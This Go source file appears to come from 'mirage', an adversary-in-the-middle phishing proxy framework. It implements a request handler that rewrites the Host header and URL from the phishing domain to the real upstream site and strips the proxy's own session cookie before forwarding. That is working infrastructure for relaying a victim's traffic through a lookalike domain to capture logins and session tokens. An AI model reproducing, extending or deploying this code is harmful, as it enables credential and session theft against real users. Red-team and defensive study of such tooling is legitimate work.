package request

import (
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// URLRewriter rewrites the request URL and Host header from the phishing domain
// back to the real upstream domain before forwarding to origin.
type URLRewriter struct{}

func (h *URLRewriter) Name() string { return "URLRewriter" }

func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil {
		return nil
	}
	if ph := ctx.Phishlet.FindProxyHost(req.Host); ph != nil {
		origin := ph.OriginHost()
		req.Host = origin
		req.URL.Host = origin
		req.URL.Scheme = ph.UpstreamScheme
	}
	stripCookie(req, proxy.SessionCookieName)
	return nil
}

func stripCookie(req *http.Request, name string) {
	cookies := req.Cookies()
	req.Header.Del("Cookie")
	for _, cookie := range cookies {
		if cookie.Name != name {
			req.AddCookie(cookie)
		}
	}
}

var _ proxy.RequestHandler = (*URLRewriter)(nil)
